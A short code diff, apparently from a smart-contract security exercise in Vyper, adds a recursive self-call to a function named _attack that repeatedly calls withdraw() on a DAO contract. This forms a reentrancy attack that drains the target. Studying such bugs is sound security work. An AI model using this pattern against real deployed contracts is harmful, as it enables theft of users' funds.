@@ -19,6 +19,7 @@ def _attack() -> bool:
     # Make sure you add a "base case" to end the recursion
     if DAO(self.dao_address).withdraw()==False:
         return False
+    self._attack()
     return True
 
 @external
